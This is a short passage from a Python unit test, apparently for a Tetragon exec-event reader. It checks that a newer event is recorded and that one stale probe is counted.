    late["time"] = (WALL + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%S.%f000Z")
    tetragon.write(exec_line(old), json.dumps(late))
    reader = make_reader(stale_probes_before=WALL)
    reader.poll()
    assert box.argvs() == [new]  # unexpected and newer than the reader: recorded, as before
    assert reader.stats()["stale_probes"] == 1
